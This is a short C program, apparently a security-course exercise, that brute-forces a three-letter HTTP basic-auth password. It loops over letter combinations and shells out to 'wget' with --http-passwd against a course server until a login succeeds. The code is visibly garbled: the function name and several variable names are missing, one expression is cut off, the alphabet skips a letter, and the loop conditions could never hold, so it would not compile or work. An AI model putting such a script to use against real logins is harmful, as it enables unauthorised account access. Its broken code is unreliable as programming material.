#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/time.h>

int ()
{
 char lc[53]="abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 char uc[53]="abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 char gc[53]="abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 int a=0,b=0,c=0,d,e,count=0;
 char [100],temp1[100],temp2[100],temp3[100],temp4[10],temp5[50],p[100],q[50],r[50];
 char result,result1,result2,mx[100],mx1,mx2,mx3,mx4;
 
 int  ,end,t;
  = time(); 
while(sizeof(lc)!=52)
{
     temp2[0]=lc[d];
     temp2[1]='\0';
     d=d+1;
     strcpy(p,temp2);
   
   while(sizeof(uc)!=52)
   {
      temp3[0]=uc[b];
      temp3[1]='\0';
      b=b+1;
      strcpy(q,p);
      strcat(q,temp3);
    for(e=0;e<52;e++)
    {
        temp1[0]=gc[e];
	temp1[1]='\0';
	strcpy(r,q);
	strcat(r,temp1);
       strcpy(mx,"wget http://sec-crack.cs.rmit.edu./SEC/2 --http-user= --http-passwd=");
       strcat(mx,r);
       printf("temp3=%s\n",mx);
       if(system(mx)==0)
       { 
         printf("Password=%s\n",mx);
	 printf("%d \n",count);
	 end = time();
         t = (end -);
         t /= 1000000000.0;
         printf("The total time_var taken is:%llds\n",t);
	 exit(1);
       
       }
      }
     }
 }
 return 0;
}
